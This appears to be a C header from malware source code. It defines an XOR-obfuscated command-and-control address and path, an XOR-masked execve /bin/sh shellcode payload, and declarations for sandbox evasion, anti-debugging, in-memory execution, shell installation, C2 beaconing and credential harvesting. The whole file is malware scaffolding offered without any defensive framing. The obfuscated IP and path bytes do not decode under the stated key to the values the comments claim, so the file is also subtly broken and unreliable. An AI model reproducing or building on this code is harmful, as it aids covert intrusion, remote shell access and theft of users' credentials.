#ifndef COMMON_H
#define COMMON_H

#include <stddef.h>

#define XOR_KEY 0x7A
#define C2_PORT 8080
#define ENC_C2_IP_LEN 13
#define ENC_PATH_LEN 5

static const char enc_c2_ip[ENC_C2_IP_LEN] = {0x13, 0x36, 0x3A, 0x3F, 0x3D, 0x3C, 0x33, 0x3F, 0x5A, 0x5A, 0x5A, 0x5A, 0x00}; // "192.168.1.100"
static const char enc_c2_path[ENC_PATH_LEN] = {0x3A, 0x31, 0x2E, 0x3B, 0x00}; // "/api"

// shell payload
static unsigned char encrypted_shellcode[] = {
    0x31 ^ 0xA3, 0xc0 ^ 0xA3, 0x50 ^ 0xA3, 0x68 ^ 0xA3, 0x2f ^ 0xA3, 0x2f ^ 0xA3, 0x73 ^ 0xA3, 0x68 ^ 0xA3,
    0x68 ^ 0xA3, 0x2f ^ 0xA3, 0x62 ^ 0xA3, 0x69 ^ 0xA3, 0x6e ^ 0xA3, 0x89 ^ 0xA3, 0xe3 ^ 0xA3, 0x50 ^ 0xA3,
    0x53 ^ 0xA3, 0x89 ^ 0xA3, 0xe1 ^ 0xA3, 0xb0 ^ 0xA3, 0x0b ^ 0xA3, 0xcd ^ 0xA3, 0x80 ^ 0xA3
};
static const unsigned char shell_key = 0xA3;
static const size_t shell_len = sizeof(encrypted_shellcode);

void xor_decrypt(char *dst, const char *src, size_t len, char key);
int is_sandboxed(void);
void anti_debug(void);
void exec_in_mem(unsigned char *buf, size_t len);
void install_shell(void);
void call_c2(const char *msg);
void harvest_creds(void);

#endif
